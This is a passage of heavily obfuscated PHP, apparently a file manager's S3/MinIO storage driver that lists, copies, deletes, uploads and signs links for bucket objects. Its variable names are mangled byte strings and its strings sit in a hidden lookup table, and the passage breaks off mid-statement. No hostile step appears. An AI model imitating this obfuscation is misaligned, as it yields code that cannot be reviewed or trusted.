isset($¡¸š¿¯½[$Äü‡ÇÖ•[180]]) ? $¡¸š¿¯½[$Äü‡ÇÖ•[180]] : http_type(); $‘úúÅ£Ø = isset($¡¸š¿¯½[$Äü‡ÇÖ•[181]]) ? $¡¸š¿¯½[$Äü‡ÇÖ•[181]] : $¡¸š¿¯½[$Äü‡ÇÖ•[84]]; if (isset($¡¸š¿¯½[$Äü‡ÇÖ•[182]])) { $‘úúÅ£Ø .= $Äü‡ÇÖ•[4] . $¡¸š¿¯½[$Äü‡ÇÖ•[182]]; } return $¬îÍ™ . $Äü‡ÇÖ•[183] . $‘úúÅ£Ø; } public function pathEncode($·Ú±ÁŸ¼) { $ Ì‹ğ÷© =& $_SERVER[Ã¶¡¶„æ]; return str_replace($ Ì‹ğ÷©[184], $ Ì‹ğ÷©[8], rawurlencode($·Ú±ÁŸ¼)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($İ™½–Šõ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ã¶¡¶„æ][185]; parent::__construct(); $this->_init($İ™½–Šõ); } public function _init($ÀÙ‚êê) { foreach ($ÀÙ‚êê as $ğîìµø => $¥¶òàˆĞ) { if (isset($this->{$ğîìµø})) { $this->{$ğîìµø} = $¥¶òàˆĞ; } } $this->endpoint = $ÀÙ‚êê[$_SERVER[Ã¶¡¶„æ][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ïŒ‡—÷ = "\x76\x34") { $this->signVer = $ïŒ‡—÷; $this->client->setSignatureVersion($ïŒ‡—÷); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ ±¶­š® =& $_SERVER[Ã¶¡¶„æ]; $æ…ãıˆ° = $this->getBucketCors(); if (!$æ…ãıˆ° || !is_array($æ…ãıˆ°)) { return !1; } if ($æ…ãıˆ°[$ ±¶­š®[187]] != $ ±¶­š®[188] || $æ…ãıˆ°[$ ±¶­š®[189]] != $ ±¶­š®[188]) { return !1; } $ïù‡¼è = array_map($ ±¶­š®[190], $æ…ãıˆ°[$ ±¶­š®[191]]); if (!is_array($ïù‡¼è)) { $ïù‡¼è = array(); } $ôèïäæ˜ = array($ ±¶­š®[192], $ ±¶­š®[193], $ ±¶­š®[194], $ ±¶­š®[195], $ ±¶­š®[196]); $™óÜèå… = array_diff($ôèïäæ˜, $ïù‡¼è); return empty($™óÜèå…); } public function mkfile($¹ıè´º, $­ª–¬£ = '', $óíñŸèµ = REPEAT_RENAME) { $¯Ó•± = $this->setContent($¹ıè´º, $­ª–¬£); if ($¯Ó•± !== !1) { return $this->getPathOuter($¹ıè´º); } return !1; } public function mkdir($şÁÌ˜ÂÍ, $ô½äÜá– = REPEAT_SKIP) { $ï°å¸ßğ =& $_SERVER[Ã¶¡¶„æ]; if (empty($şÁÌ˜ÂÍ) && $şÁÌ˜ÂÍ !== $ï°å¸ßğ[197]) { return !1; } if ($ô½äÜá– && $this->_isFolder($şÁÌ˜ÂÍ)) { return $this->getPathOuter($şÁÌ˜ÂÍ); } $ğëó¡ãŸ = $this->setContent($şÁÌ˜ÂÍ, $ï°å¸ßğ[12], !0); if ($ğëó¡ãŸ !== !1) { return $this->getPathOuter($şÁÌ˜ÂÍ); } return !1; } public function copyFile($ï–«úšÎ, $â³üØÕ, $ŞˆŸîì„ = array()) { $ÃÁş¬êÛ =& $_SERVER[Ã¶¡¶„æ]; $¹‘Í˜Ñ£ = $this->objectMeta($ï–«úšÎ); if (!$¹‘Í˜Ñ£) { return !1; } if ($¹‘Í˜Ñ£[$ÃÁş¬êÛ[76]] <= 1024 * 1024 * 200) { $«œıÆİŸ = $this->client->copyObject($this->bucket, $ï–«úšÎ, $this->bucket, $â³üØÕ, $ÃÁş¬êÛ[198], $ŞˆŸîì„); } else { $«œıÆİŸ = $this->client->multiCopyObject($this->bucket, $ï–«úšÎ, $this->bucket, $â³üØÕ, $ŞˆŸîì„); } $«œıÆİŸ = $«œıÆİŸ ? $this->getPathOuter($â³üØÕ) : !1; return $«œıÆİŸ; } public function moveFile($Å’¢Õ”, $«§ùÒÙ¢) { if ($this->copyFile($Å’¢Õ”, $«§ùÒÙ¢)) { $this->delFile($Å’¢Õ”); return $this->getPathOuter($«§ùÒÙ¢); } return !1; } public function delFile($×ß‡Ìƒæ) { return $this->client->deleteObject($this->bucket, $×ß‡Ìƒæ); } public function delFolder($Ê¹ ¢ıË) { $‘·¼È×Ê =& $_SERVER[Ã¶¡¶„æ]; if (!$this->exist($Ê¹ ¢ıË)) { return !0; } $this->listItemCache = !1; $¶¡ê¥¬½ = $this->fileList($Ê¹ ¢ıË); $this->listItemCache = !0; $Ø÷„šê = trim($Ê¹ ¢ıË, $‘·¼È×Ê[8]) . $‘·¼È×Ê[8]; if (!empty($Ê¹ ¢ıË) && $Ê¹ ¢ıË !== $‘·¼È×Ê[197] && !in_array($Ø÷„šê, $¶¡ê¥¬½[$‘·¼È×Ê[82]])) { $¶¡ê¥¬½[$‘·¼È×Ê[82]][] = $Ø÷„šê; } $€¯¥¹õÏ = $this->delByBatch($¶¡ê¥¬½[$‘·¼È×Ê[83]]); if (!$€¯¥¹õÏ) { return !1; } $€¯¥¹õÏ = $this->delByBatch($¶¡ê¥¬½[$‘·¼È×Ê[82]]); if (!$€¯¥¹õÏ) { return !1; } return $this->delFile($Ø÷„šê); } private function delByBatch($áæï™¹Ñ) { foreach (array_chunk($áæï™¹Ñ, 1000) as $‡Û½Ø®‰) { $Ø±ó‹‰ù = $this->client->deleteObjects($this->bucket, $‡Û½Ø®‰); if (!$Ø±ó‹‰ù) { return !1; } } return !0; } public function rename($Ó¬èÏ·ï, $ÇÂşÍ„™) { return $this->renameObject($Ó¬èÏ·ï, $ÇÂşÍ„™); } public function listPath($Ö†ìÄò, $ÎÔâ¯¿ = false) { $õÅÀûÓ“ =& $_SERVER[Ã¶¡¶„æ]; $Øê¥Œ´ = $this->fileList($Ö†ìÄò, $õÅÀûÓ“[8], !0); foreach ($Øê¥Œ´[$õÅÀûÓ“[82]] as $‡ï¥Ò‘á => $ê¹ÔÆ) { $Øê¥Œ´[$õÅÀûÓ“[82]][$‡ï¥Ò‘á] = $this->folderInfo($ê¹ÔÆ, $ÎÔâ¯¿, $ê¹ÔÆ); } foreach ($Øê¥Œ´[$õÅÀûÓ“[83]] as $‡ï¥Ò‘á => $ê¹ÔÆ) { $Øê¥Œ´[$õÅÀûÓ“[83]][$‡ï¥Ò‘á] = $this->fileInfo($ê¹ÔÆ[$õÅÀûÓ“[32]], $ÎÔâ¯¿, $ê¹ÔÆ); } return $Øê¥Œ´; } protected function infoChildren($±ûû†Œö, &$¤Öå¦œ…) { $›û¸¥ùğ =& $_SERVER[Ã¶¡¶„æ]; $ü€Í‰Ìî = $this->fileList($±ûû†Œö, $›û¸¥ùğ[12], !0); $¤Öå¦œ…[$›û¸¥ùğ[78]] += count($ü€Í‰Ìî[$›û¸¥ùğ[82]]); $¤Öå¦œ…[$›û¸¥ùğ[77]] += count($ü€Í‰Ìî[$›û¸¥ùğ[83]]); foreach ($ü€Í‰Ìî[$›û¸¥ùğ[83]] as $ì¯Å‹ûÎ) { if (!$ì¯Å‹ûÎ || !$ì¯Å‹ûÎ[$›û¸¥ùğ[76]]) { continue; } $¤Öå¦œ…[$›û¸¥ùğ[76]] += $ì¯Å‹ûÎ[$›û¸¥ùğ[76]]; } } private function fileInfo($ó¿ÕäÁ¿, $åäáÎ×Á = false, $úÌ×”£ = array()) { $ÈÆÃ´Á =& $_SERVER[Ã¶¡¶„æ]; $İş«¢ü = array($ÈÆÃ´Á[32] => $this->pathThis($ó¿ÕäÁ¿), $ÈÆÃ´Á[84] => $this->getPathOuter($ó¿ÕäÁ¿), $ÈÆÃ´Á[33] => $ÈÆÃ´Á[199], $ÈÆÃ´Á[174] => $this->ext($ó¿ÕäÁ¿), $ÈÆÃ´Á[76] => isset($úÌ×”£[$ÈÆÃ´Á[76]]) ? $úÌ×”£[$ÈÆÃ´Á[76]] : 0); if ($åäáÎ×Á) { return $İş«¢ü; } $İş«¢ü[$ÈÆÃ´Á[200]] = $İş«¢ü[$ÈÆÃ´Á[85]] = 0; $İş«¢ü[$ÈÆÃ´Á[201]] = $İş«¢ü[$ÈÆÃ´Á[202]] = !0; if (empty($úÌ×”£)) { $úÌ×”£ = $this->objectMeta($ó¿ÕäÁ¿); if (!$úÌ×”£) { return $İş«¢ü; } } if (isset($úÌ×”£[$ÈÆÃ´Á[203]])) { $İş«¢ü[$ÈÆÃ´Á[85]] = $úÌ×”£[$ÈÆÃ´Á[203]]; } if (isset($úÌ×”£[$ÈÆÃ´Á[76]])) { $İş«¢ü[$ÈÆÃ´Á[76]] = $úÌ×”£[$ÈÆÃ´Á[76]]; } return $İş«¢ü; } private function folderInfo($€¸¢ÛÈë, $Ÿ•”ÄçÒ = false, $úó„Ô´ˆ = array()) { $³¿ÃÃÈ† =& $_SERVER[Ã¶¡¶„æ]; $ÒŒö…¾ô = array($³¿ÃÃÈ†[32] => $this->pathThis($€¸¢ÛÈë), $³¿ÃÃÈ†[84] => $this->getPathOuter($³¿ÃÃÈ†[8] . $€¸¢ÛÈë), $³¿ÃÃÈ†[33] => $³¿ÃÃÈ†[75]); if ($Ÿ•”ÄçÒ) { return $ÒŒö…¾ô; } $ÒŒö…¾ô[$³¿ÃÃÈ†[200]] = $ÒŒö…¾ô[$³¿ÃÃÈ†[85]] = 0; $ÒŒö…¾ô[$³¿ÃÃÈ†[201]] = $ÒŒö…¾ô[$³¿ÃÃÈ†[202]] = !0; if ($€¸¢ÛÈë == $³¿ÃÃÈ†[12]) { return $ÒŒö…¾ô; } if (empty($úó„Ô´ˆ)) { $úó„Ô´ˆ = $this->objectMeta(trim($€¸¢ÛÈë, $³¿ÃÃÈ†[8]) . $³¿ÃÃÈ†[8]); } if (isset($úó„Ô´ˆ[$³¿ÃÃÈ†[203]])) { $ÒŒö…¾ô[$³¿ÃÃÈ†[200]] = $úó„Ô´ˆ[$³¿ÃÃÈ†[203]]; } return $ÒŒö…¾ô; } private function fileList($Óôà€Ï, $·¡ã·› = '', $ ºîŒá = 0) { $ÌáëÎ¿ =& $_SERVER[Ã¶¡¶„æ]; $›İåƒ’­ = rtrim($Óôà€Ï, $ÌáëÎ¿[8]) . $ÌáëÎ¿[8]; $Œ³ü½ı = $this->listObjs($›İåƒ’­, null, null, $·¡ã·›); if (!$Œ³ü½ı) { return array($ÌáëÎ¿[82] => array(), $ÌáëÎ¿[83] => array()); } $Ø³Õ’ÂÊ = $Å’³¹ôû = array(); foreach ($Œ³ü½ı[$ÌáëÎ¿[204]] as $Ö˜ò¢Ÿ½) { $–©ñ™®± = $Ö˜ò¢Ÿ½[$ÌáëÎ¿[32]]; if ($–©ñ™®± == $›İåƒ’­) { continue; } $‰¯ˆÉ‡Ç = isset($Ö˜ò¢Ÿ½[$ÌáëÎ¿[76]]) ? $Ö˜ò¢Ÿ½[$ÌáëÎ¿[76]] : 0; $ä°¤©¯ã = $‰¯ˆÉ‡Ç == 0 && substr($–©ñ™®±, strlen($–©ñ™®±) - 1, 1) == $ÌáëÎ¿[8] ? !0 : !1; $this->cacheMethodInfoSet($–©ñ™®±, $ä°¤©¯ã, $Ö˜ò¢Ÿ½); if ($ä°¤©¯ã) { $Ø³Õ’ÂÊ[] = $–©ñ™®±; continue; } $Å’³¹ôû[] = $ ºîŒá ? $Ö˜ò¢Ÿ½ : $–©ñ™®±; } foreach ($Œ³ü½ı[$ÌáëÎ¿[205]] as $Ö˜ò¢Ÿ½) { $Ø³Õ’ÂÊ[] = $Ö˜ò¢Ÿ½[$ÌáëÎ¿[32]]; $this->cacheMethodInfoSet($Ö˜ò¢Ÿ½[$ÌáëÎ¿[32]], !0); } $this->cacheMethodInfoSet($Óôà€Ï, !0); return array($ÌáëÎ¿[82] => $Ø³Õ’ÂÊ, $ÌáëÎ¿[83] => $Å’³¹ôû); } private function listObjs($‘È†ö×Ù, $ÍÒÑ = null, $ÜßÉèôİ = null, $ôÌÑñ¿¼ = null) { $è¤Š½Ú¤ =& $_SERVER[Ã¶¡¶„æ]; $‘È†ö×Ù = trim($‘È†ö×Ù, $è¤Š½Ú¤[8]); $›ãåÍÖÊ = empty($‘È†ö×Ù) && $‘È†ö×Ù !== $è¤Š½Ú¤[197] ? $è¤Š½Ú¤[12] : $‘È†ö×Ù . $è¤Š½Ú¤[8]; return $this->client->getBucket($this->bucket, $›ãåÍÖÊ, $ÍÒÑ, $ÜßÉèôİ, $ôÌÑñ¿¼, !0); } public function has($Îëšğ”‹, $Œ¹úáßè = false, $İĞ´ãæ÷ = true) { $”¤¹Ş•Ç =& $_SERVER[Ã¶¡¶„æ]; $Îëšğ”‹ = trim($Îëšğ”‹, $”¤¹Ş•Ç[8]); $‹ûî«¥‹ = empty($Îëšğ”‹) && $Îëšğ”‹ !== $”¤¹Ş•Ç[197] ? $”¤¹Ş•Ç[12] : $Îëšğ”‹ . $”¤¹Ş•Ç[8]; $úœØ±É‰ = null; $ÔÎ”®ä = 500; $Â„ê¦îğ = $”¤¹Ş•Ç[8]; $Ê«Æä»ó = $®¹ÈŸÀÖ = array(); while (!0) { $”ÉÆŸÄ = $this->listObjs($Îëšğ”‹, $úœØ±É‰, $ÔÎ”®ä, $Â„ê¦îğ); if (!$”ÉÆŸÄ) { break; } $úœØ±É‰ = $”ÉÆŸÄ[$”¤¹Ş•Ç[206]]; $ƒø˜÷‘‘ = $”ÉÆŸÄ[$”¤¹Ş•Ç[204]]; $ÑÅ–°–Ù = $”ÉÆŸÄ[$”¤¹Ş•Ç[205]]; if (empty($ƒø˜÷‘‘) && empty($ÑÅ–°–Ù)) { break; } if (count($ƒø˜÷‘‘) == 1 && $ƒø˜÷‘‘[0][$”¤¹Ş•Ç[32]] == $‹ûî«¥‹) { break; } if ($Œ¹úáßè) { if (count($ƒø˜÷‘‘)) { $ƒø˜÷‘‘ = array_column($ƒø˜÷‘‘, $”¤¹Ş•Ç[32]); $Ê«Æä»ó = array_merge($Ê«Æä»ó, $ƒø˜÷‘‘); } if (count($ÑÅ–°–Ù)) { $ÑÅ–°–Ù = array_column($ÑÅ–°–Ù, $”¤¹Ş•Ç[32]); $®¹ÈŸÀÖ = array_merge($®¹ÈŸÀÖ, $ÑÅ–°–Ù); } if ($úœØ±É‰ === null) { break; } continue; } if ($İĞ´ãæ÷) { if (!empty($ƒø˜÷‘‘)) { if (count($ƒø˜÷‘‘) > 1 || isset($ƒø˜÷‘‘[0][$”¤¹Ş•Ç[32]]) && $ƒø˜÷‘‘[0][$”¤¹Ş•Ç[32]] != $‹ûî«¥‹) { return !0; } } } else { if (!empty($ÑÅ–°–Ù)) { return !0; } } if ($úœØ±É‰ === null) { break; } } if ($Œ¹úáßè) { $Ê«Æä»ó = array_diff($Ê«Æä»ó, array($‹ûî«¥‹)); $Ê«Æä»ó = count(array_unique($Ê«Æä»ó)); $®¹ÈŸÀÖ = count(array_unique($®¹ÈŸÀÖ)); return array($”¤¹Ş•Ç[207] => $Ê«Æä»ó, $”¤¹Ş•Ç[208] => $®¹ÈŸÀÖ); } return !1; } public function listAll($¸¡óÛ±) { $¿àì =& $_SERVER[Ã¶¡¶„æ]; $©ãëÎ¨Õ = $this->fileList($¸¡óÛ±, $¿àì[12], !0); $»î¯³ı² = array(); foreach ($©ãëÎ¨Õ[$¿àì[83]] as $şÑÇû“) { $»î¯³ı²[$şÑÇû“[$¿àì[32]]] = $şÑÇû“[$¿àì[76]]; } foreach ($©ãëÎ¨Õ[$¿àì[82]] as $şÑÇû“) { if (is_string($şÑÇû“)) { $»î¯³ı²[$şÑÇû“] = 0; } } return $this->listAllFiles($¸¡óÛ±, array_keys($»î¯³ı²), $»î¯³ı²); } public function canRead($¤¢©ü’Â) { $²È›ã¿Û =& $_SERVER[Ã¶¡¶„æ]; $ü¦ÁñüŠ = $this->client->getAccessControlPolicy($this->bucket, $¤¢©ü’Â); if (!$ü¦ÁñüŠ) { return !1; } return in_array($ü¦ÁñüŠ, array($²È›ã¿Û[209], $²È›ã¿Û[210], $²È›ã¿Û[211])) ? !0 : !1; } public function canWrite($¬âØÆ×¦) { $á©¾Ò±Ì =& $_SERVER[Ã¶¡¶„æ]; $²Ìæİ¥¹ = $this->client->getAccessControlPolicy($this->bucket, $¬âØÆ×¦); if (!$²Ìæİ¥¹) { return !1; } return in_array($²Ìæİ¥¹, array($á©¾Ò±Ì[209], $á©¾Ò±Ì[210])) ? !0 : !1; } public function getContent($°úòĞó¬) { return $this->client->getObject($this->bucket, $°úòĞó¬); } public function setContent($×Ò¹Å—Ş, $ºÊ™ğÏÔ = '', $Øé±Ç™ = false) { $ÂÈË¿âœ =& $_SERVER[Ã¶¡¶„æ]; $×Ò¹Å—Ş = $Øé±Ç™ ? trim($×Ò¹Å—Ş, $ÂÈË¿âœ[8]) . $ÂÈË¿âœ[8] : $×Ò¹Å—Ş; $¶Ù„ò­´ = get_file_mime(get_path_ext($×Ò¹Å—Ş)); $«Éê¨Õ® = $this->client->putObject($ºÊ™ğÏÔ, $this->bucket, $×Ò¹Å—Ş, $ÂÈË¿âœ[198], array(), $¶Ù„ò­´); if (!$«Éê¨Õ®) { return !1; } if ($Øé±Ç™) { return !0; } $this->cacheMethod(null, null); $«Éê¨Õ® = $this->copyFile($×Ò¹Å—Ş, $×Ò¹Å—Ş, array($ÂÈË¿âœ[212] => $«Éê¨Õ®[$ÂÈË¿âœ[213]])); return $«Éê¨Õ® ? !0 : !1; } public function fileSubstr($òõíèİ, $€Å­Ô„ñ, $Ë¸ŒƒÏ) { $ÙÉöÇ˜ = $€Å­Ô„ñ + $Ë¸ŒƒÏ - 1; return $this->client->getObject($this->bucket, $òõíèİ, array($_SERVER[Ã¶¡¶„æ][214] => "\x62\x79\164\x65\x73\75{$€Å­Ô„ñ}\x2d{$ÙÉöÇ˜}")); } public function upload($„¢„‚°, $ó×Ú¯Æ, $Éïó¼ÑÁ = false, $Ñ¦Ãœš  = REPEAT_REPLACE) { $şåÇšİ =& $_SERVER[Ã¶¡¶„æ]; $åô†Á = array($şåÇšİ[212] => @md5_file($ó×Ú¯Æ)); $ĞêìóÊì = array($şåÇšİ[215] => get_file_mime(get_path_ext($„¢„‚°))); if (IO::size($ó×Ú¯Æ) <= 1024 * 1024 * 200) { $í»Áóà÷ = $this->client->putObjectFile($ó×Ú¯Æ, $this->bucket, $„¢„‚°, $şåÇšİ[198], $åô†Á, $ĞêìóÊì); return !empty($í»Áóà÷) ? $this->getPathOuter($„¢„‚°) : !1; } $ì¢ÇëÒé = $this->client->multiUploadObject($ó×Ú¯Æ, $this->bucket, trim($„¢„‚°, $şåÇšİ[8]), $åô†Á, $ĞêìóÊì); return $ì¢ÇëÒé ? $this->getPathOuter($„¢„‚°) : !1; } public function download($äé™ˆ¿¤, $ßïíÕ“ñ) { if (!@is_dir($this->pathFather($ßïíÕ“ñ)) && !IO::mkdir($this->pathFather($ßïíÕ“ñ))) { return !1; } $ Á±¦„ì = $this->client->getObject($this->bucket, $äé™ˆ¿¤, array(), $ßïíÕ“ñ); return $ Á±¦„ì !== !1 ? $ßïíÕ“ñ : !1; } public function link($ÈÕ™£Ñö, $Ûû…º…¶ = array()) { $¡¬ÄŸÙß =& $_SERVER[Ã¶¡¶„æ]; if ($this->signVer == $¡¬ÄŸÙß[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ÈÕ™£Ñö, 3600 * 12, $Ûû…º…¶); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÈÕ™£Ñö, $¡¬ÄŸÙß[8]), 3600 * 12, $this->region, array(), !0, $Ûû…º…¶); } public function fileOut($Ù£ë³Í’, $Õ–ÙÎŠ = false, $ŠêİÌ¬ = false, $Ì»‘ï‘ = '') { $‹ŠÓÀÜ =& $_SERVER[Ã¶¡¶„æ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ù£ë³Í’, $Õ–ÙÎŠ, $ŠêİÌ¬, $Ì»‘ï‘); } if (!$ŠêİÌ¬) { $ŠêİÌ¬ = $this->pathThis($Ù£ë³Í’); } $™¹¾Ğ¬á = get_file_mime(get_path_ext($ŠêİÌ¬)); if ($™¹¾Ğ¬á == $‹ŠÓÀÜ[217]) { return parent::fileOut($Ù£ë³Í’, $Õ–ÙÎŠ, $ŠêİÌ¬, $Ì»‘ï‘); } $¸½å•ş = array($‹ŠÓÀÜ[218] => $™¹¾Ğ¬á); if ($Õ–ÙÎŠ) { $¸½å•ş[$‹ŠÓÀÜ[219]] = $‹ŠÓÀÜ[220] . rawurlencode($ŠêİÌ¬); } else { } $ÉßĞÙâ° = $this->link($Ù£ë³Í’, $¸½å•ş); $this->fileOutLink($ÉßĞÙâ°); } public function fileOutServer($†„„’¶, $Á³Ÿàó£ = false, $¤È†Íüô = false, $²ñ¯¨ÅŠ = '') { parent::fileOut($†„„’¶, $Á³Ÿàó£, $¤È†Íüô, $²ñ¯¨ÅŠ); } public function fileOutImageServer($›‡¥’ò¯, $š¥¥ƒÊ„ = 250) { parent::fileOutImage($›‡¥’ò¯, $š¥¥ƒÊ„); } public function hashMd5($Ğ’¨Î½‡, $«¯ëñ×á = '') { $Óíø£Õ‚ =& $_SERVER[Ã¶¡¶„æ]; $ô¸†ä–½ = $this->objectMeta($Ğ’¨Î½‡); if (!$ô¸†ä–½) { return !1; } $«¯ëñ×á = $«¯ëñ×á ? $«¯ëñ×á : _get($ô¸†ä–½, $Óíø£Õ‚[221]); $«¯ëñ×á = $«¯ëñ×á ? $«¯ëñ×á : _get($ô¸†ä–½, $Óíø£Õ‚[213], $Óíø£Õ‚[12]); return $«¯ëñ×á; } public function uploadFormData($ï†§ŠÛö, $•äÁ‘¤† = 3600) { $ †´‰ =& $_SERVER[Ã¶¡¶„æ]; $ŸÂÃ×· = $this->pathFather($ï†§ŠÛö); $ãÅœÁÙ» = $this->client->getHttpUploadPostParams($this->bucket, $ŸÂÃ×·, $ †´‰[198], $•äÁ‘¤†); return array_merge((array) $ãÅœÁÙ», array($ †´‰[181] => $this->getHost())); } public function multiUploadFormData($î£Öíä¢, $º¦Óí®„ = 3600) { $÷ëÕ¬€ =& $_SERVER[Ã¶¡¶„æ]; $÷£Ïûø = gmdate($÷ëÕ¬€[222]); $¯ë¢ï Ç = array(); $ŸÙãñ’ñ = $this->client->getUploadId($this->bucket, $î£Öíä¢, $¯ë¢ï Ç); if (!$ŸÙãñ’ñ) { return !1; } return array($÷ëÕ¬€[223] => $ŸÙãñ’ñ, $÷ëÕ¬€[181] => $this->getHost() . $÷ëÕ¬€[8] . $this->pathEncode($î£Öíä¢), $÷ëÕ¬€[224] => $÷£Ïûø, $÷ëÕ¬€[94] => $î£Öíä¢); } public function multiUploadAuthData($÷‚›±›é, $ê‡™˜åß = array()) { $Ø‹¢á Ş =& $_SERVER[Ã¶¡¶„æ]; $©–°…²Ê = isset($ê‡™˜åß[$Ø‹¢á Ş[224]]) ? $ê‡™˜åß[$Ø‹¢á Ş[224]] : gmdate($Ø‹¢á Ş[222]); $é¨í­Ï· = isset($ê‡™˜åß[$Ø‹¢á Ş[174]]) ? $ê‡™˜åß[$Ø‹¢á Ş[174]] : $Ø‹¢á Ş[12]; $Æ¡¼¨íÀ = $ê‡™˜åß[$Ø‹¢á Ş[94]]; unset($ê‡™˜åß[$Ø‹¢á Ş[94]]); if (isset($ê‡™˜åß[$Ø‹¢á Ş[225]])) { $ê‡™˜åß[$Ø‹¢á Ş[224]] = $©–°…²Ê; return $this->listUploadParts($Æ¡¼¨íÀ, $ê‡™˜åß); } $ÊÈ¢ä…ı = array($Ø‹¢á Ş[226], $Ø‹¢á Ş[12], $Ø‹¢á Ş[120], $Ø‹¢á Ş[12], "\170\55\x61\x6d\x7a\55\x64\141\x74\145\x3a{$©–°…²Ê}", $Ø‹¢á Ş[8] . $this->bucket . $Ø‹¢á Ş[8] . $this->pathEncode($Æ¡¼¨íÀ) . $é¨í­Ï·); if (strpos($é¨í­Ï·, $Ø‹¢á Ş[227]) === 0) { $ÊÈ¢ä…ı[0] = $Ø‹¢á Ş[228]; } if (isset($ê‡™˜åß[$Ø‹¢á Ş[229]]) && $ê‡™˜åß[$Ø‹¢á Ş[229]] == $Ø‹¢á Ş[230]) { $ÊÈ¢ä…ı[0] = $Ø‹¢á Ş[230]; } $¤”Ö›¶ = implode($Ø‹¢á Ş[231], $ÊÈ¢ä…ı); $ûö¶¼õ± = base64_encode(hash_hmac($Ø‹¢á Ş[232], $¤”Ö›¶, $this->secret, !0)); $©€ÏÁªˆ = $Ø‹¢á Ş[233] . $this->accessKey . $Ø‹¢á Ş[4] . $ûö¶¼õ±; if (strpos($é¨í­Ï·, $Ø‹¢á Ş[227]) === 0) { return array($Ø‹¢á Ş[234] => $©€ÏÁªˆ, $Ø‹¢á Ş[224] => $©–°…²Ê); } return $©€ÏÁªˆ; } public function listUploadParts($ÛÆ®ĞÒŠ, $ûÖ¿ôû = array()) { $’è½Ş¨¿ =& $_SERVER[Ã¶¡¶„æ]; $­ñá‘… = str_replace($’è½Ş¨¿[235], $’è½Ş¨¿[12], $ûÖ¿ôû[$’è½Ş¨¿[174]]); $Ó°µ¿Šê = $this->client->listParts($this->bucket, $ÛÆ®ĞÒŠ, $­ñá‘…); if (!$Ó°µ¿Šê) { return !1; } unset($ûÖ¿ôû[$’è½Ş¨¿[225]], $ûÖ¿ôû[$’è½Ş¨¿[229]]); $ûÖ¿ôû[$’è½Ş¨¿[94]] = $ÛÆ®ĞÒŠ; $Æû‚´Í = $this->multiUploadAuthData($ÛÆ®ĞÒŠ, $ûÖ¿ôû); if (empty($Æû‚´Í)) { return !1; } return array($’è½Ş¨¿[234] => $Æû‚´Í, $’è½Ş¨¿[224] => $ûÖ¿ôû[$’è½Ş¨¿[224]], $’è½Ş¨¿[236] => $Ó°µ¿Šê); } public function getHost() { return parent::getHost() . $_SERVER[Ã¶¡¶„æ][8] . $this->bucket; } public function size($¦è¼©â±) { $á¬Ï•Øî = $this->objectMeta($¦è¼©â±); return $á¬Ï•Øî ? $á¬Ï•Øî[$_SERVER[Ã¶¡¶„æ][76]] : 0; } public function info($’‡ÄÎÉ) { if ($this->isFolder($’‡ÄÎÉ)) { return $this->folderInfo($’‡ÄÎÉ); } else { if ($this->isFile($’‡ÄÎÉ)) { return $this->fileInfo($’‡ÄÎÉ); } } return !1; } public function exist($ƒÄç­ÍÂ) { return $this->isFile($ƒÄç­ÍÂ) || $this->isFolder($ƒÄç­ÍÂ); } public function isFile($ƒ­úÖÜå) { return !$this->isFolder($ƒ­úÖÜå) && $this->objectMeta($ƒ­úÖÜå); } public function isFolder($¹õª‰ôñ) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][165], $¹õª‰ôñ); } protected function objectMeta($êË‰êõ°) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][167], $êË‰êõ°); } protected function _objectMeta($ìÖ¤È‘) { $Á°²Ü‹ =& $_SERVER[Ã¶¡¶„æ]; $ìÖ¤È‘ = rtrim($ìÖ¤È‘, $Á°²Ü‹[8]); try { $ŸõÃáı‰ = $this->client->getObjectInfo($this->bucket, $ìÖ¤È‘); if (!isset($ŸõÃáı‰[$Á°²Ü‹[221]]) && isset($ŸõÃáı‰[$Á°²Ü‹[237]])) { $ŸõÃáı‰[$Á°²Ü‹[221]] = $ŸõÃáı‰[$Á°²Ü‹[237]]; } } catch (Exception $İÉ‡Ï ) { $ŸõÃáı‰ = !1; } if (!$ŸõÃáı‰) { } return $ŸõÃáı‰; } protected function _isFolder($Ü’åêó) { $à¡ëÊÌ‚ =& $_SERVER[Ã¶¡¶„æ]; $Ü’åêó = rtrim($Ü’åêó, $à¡ëÊÌ‚[8]); if ($Ü’åêó == $à¡ëÊÌ‚[12] || $Ü’åêó == $à¡ëÊÌ‚[8]) { return !0; } $‘î¨íœ· = $this->client->getBucket($this->bucket, $Ü’åêó, null, 1); if (empty($‘î¨íœ·[$à¡ëÊÌ‚[204]])) { return !1; } $şˆŸÔàÃ = $‘î¨íœ·[$à¡ëÊÌ‚[204]][0][$à¡ëÊÌ‚[32]]; return stripos($şˆŸÔàÃ, $Ü’åêó . $à¡ëÊÌ‚[8]) === 0 ? !0 : !1; if (substr($şˆŸÔàÃ, -1) == $à¡ëÊÌ‚[8]) { return !0; } if (get_path_this($şˆŸÔàÃ) == get_path_this($Ü’åêó)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($®Á´Û¨Â) { parent::__construct($®Á´Û¨Â); $this->signatureVersion($_SERVER[Ã¶¡¶„æ][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto F×–½ÓŒŒ²; C™ ªñªµ‚: class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\x52\x65\x63\171\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\x46\x69\154\x65\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\162\106\x69\x6c\145\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = 